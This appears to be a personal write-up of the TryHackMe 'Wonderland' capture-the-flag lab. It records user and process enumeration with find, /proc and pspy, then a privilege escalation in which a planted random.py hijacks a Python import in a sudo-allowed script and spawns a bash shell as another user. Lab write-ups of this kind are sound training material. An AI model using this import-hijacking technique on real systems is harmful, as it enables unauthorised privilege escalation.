HowDothTheLittleCrocodileImproveHisShiningTail
## DISCOVERY 
### REGARDING THE USERS & OTHER

```bash
alice@wonderland:/$ ls -la /home

drwxr-xr-x  6 root      root      4096 May 25  2020 .
drwxr-xr-x 23 root      root      4096 May 25  2020 ..
drwxr-xr-x  5 alice     alice     4096 Jun 24 13:31 alice
drwxr-x---  3 hatter    hatter    4096 May 25  2020 hatter
drwxr-x---  2 rabbit    rabbit    4096 May 25  2020 rabbit
drwxr-x---  6 tryhackme tryhackme 4096 May 25  2020 tryhackme
```

```bash
alice@wonderland:/$ find / -user hatter 2>/dev/null
/home/hatter
alice@wonderland:/$ find / -user rabbit 2>/dev/null
/home/rabbit
alice@wonderland:/$ find / -user tryhackme 2>/dev/null
/home/tryhackme
/proc/695  # a multithreaded application i think this is the server
```

```bash
alice@wonderland:/$ find / -group  hatter 2>/dev/null
/home/hatter
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
alice@wonderland:/$ find / -group rabbit  2>/dev/null
/home/rabbit
alice@wonderland:/$ find / -group tryhackme  2>/dev/null
/home/tryhackme
/proc/695

```

### /PROC

SPECIFICALLY the server process 

```bash
alice@wonderland:/proc/695$ cat cmdline 
/home/tryhackme/server-p80
```

### PSPY64

```bash
2024/06/24 14:10:52 CMD: UID=1000  PID=695    | /home/tryhackme/server -p 80 
```


## AFTER A LONG TIME OF * AROUND

```
alice@wonderland:/proc/721/attr$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Done, simply write a random.py in the same directory since walrus imports it, and thus we are now [[rabbit]].

random.py
```python
import pty
pty.spawn('/bin/bash')
```